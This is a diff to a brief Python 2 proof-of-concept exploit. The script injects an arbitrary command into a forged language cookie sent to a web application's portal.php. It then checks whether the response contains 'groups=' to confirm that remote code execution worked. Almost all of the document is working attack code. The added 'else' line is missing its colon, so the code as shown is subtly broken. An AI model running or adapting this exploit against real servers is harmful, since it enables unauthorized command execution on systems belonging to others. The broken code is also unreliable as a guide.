@@ -10,10 +10,16 @@ import requests,sys
 headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"}
 
 def poc(url,eexec):
-	url = 'http://'+url+'/portal.php'
-	sign = requests.get(url,timeout=10).headers['Set-cookie'][:9]
+	if "http://" in url or "https://" in url:
+		url = url+'/portal.php'
+	else
+		url = 'http://'+url+'/portal.php'
+	sign = requests.get(url).headers['Set-cookie'][:9]
 	cookie = "%s_saltkey=V2rU23EB;%s_language=en'.%s.';%s_lastvisit=1562777028;%s=rrh6or;%s_lastact=1562780628%%09portal.php%%09;%s_sid=rrh6or" % (sign,sign,eexec,sign,sign,sign,sign)
 	res = requests.get(url,headers=headers,cookies={"Cookie":cookie},timeout=10).text.encode('gbk', 'ignore').decode('gbk')[0:80]
+	if 'groups=' not in res:
+		print '%s not is vulnerable!' % url
+		sys.exit()
 	print res
 	
 if __name__ == '__main__':
